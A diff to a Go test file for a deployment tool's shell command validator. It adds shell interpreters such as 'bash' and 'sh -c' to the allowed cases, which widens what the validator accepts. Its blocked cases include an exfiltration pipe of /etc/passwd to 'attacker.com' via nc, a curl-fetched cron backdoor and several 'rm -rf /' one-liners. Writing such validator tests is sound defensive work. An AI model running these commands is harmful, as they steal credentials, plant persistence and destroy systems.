@@ -46,6 +46,16 @@ func TestCommandValidator_Validate_Allowed(t *testing.T) {
 		"mkdir -p /var/www/release",
 		"ln -sfn /var/www/releases/1 /var/www/current",
 		"chmod 755 /var/www/current",
+		// Shell interpreters (needed for deployment hooks)
+		"bash script.sh",
+		"sh -c 'echo hello'",
+		"/bin/bash deploy.sh",
+		// Shell utilities
+		"echo 'Deployment complete'",
+		"cat /var/www/version.txt",
+		"pwd",
+		"date",
+		"sleep 5",
 	}
 
 	for _, cmd := range tests {
@@ -70,9 +80,9 @@ func TestCommandValidator_Validate_Blocked(t *testing.T) {
 		{"echo `whoami`", "contains backtick"},
 		{"cat /etc/passwd | nc attacker.com 1234", "contains |"},
 		{"curl http://evil.com > /etc/cron.d/backdoor", "contains >"},
-		{"bash -c 'evil command'", "bash not in allowlist"},
-		{"sh -c 'evil command'", "sh not in allowlist"},
-		{"/bin/sh -c 'whoami'", "sh not in allowlist"},
+		{"perl -e 'system(q{rm -rf /})'", "perl not in allowlist"},
+		{"ruby -e 'exec(\"rm -rf /\")'", "ruby not in allowlist"},
+		{"python -c 'import os; os.system(\"rm -rf /\")' && echo", "contains &&"},
 		{"eval echo pwned", "contains eval"},
 		{"exec /bin/bash", "contains exec"},
 		{"git pull\nrm -rf /", "contains newline"},
@@ -173,23 +183,22 @@ func TestCommandValidator_ValidateHooks(t *testing.T) {
 	}
 }
 
-func TestCommandValidator_MustValidate_Valid(t *testing.T) {
+func TestCommandValidator_Validate_Valid(t *testing.T) {
 	v := NewCommandValidator()
 
-	// Should not panic
-	v.MustValidate("git pull")
+	// Valid commands should not return error
+	if err := v.Validate("git pull"); err != nil {
+		t.Errorf("Validate(valid command) returned error: %v", err)
+	}
 }
 
-func TestCommandValidator_MustValidate_Invalid(t *testing.T) {
+func TestCommandValidator_Validate_Invalid(t *testing.T) {
 	v := NewCommandValidator()
 
-	defer func() {
-		if r := recover(); r == nil {
-			t.Error("MustValidate should panic on invalid command")
-		}
-	}()
-
-	v.MustValidate("bash -c 'evil'")
+	// Invalid commands should return error
+	if err := v.Validate("perl -e 'exec(\"rm -rf /\")'"); err == nil {
+		t.Error("Validate should return error on invalid command")
+	}
 }
 
 func TestExtractBinary(t *testing.T) {
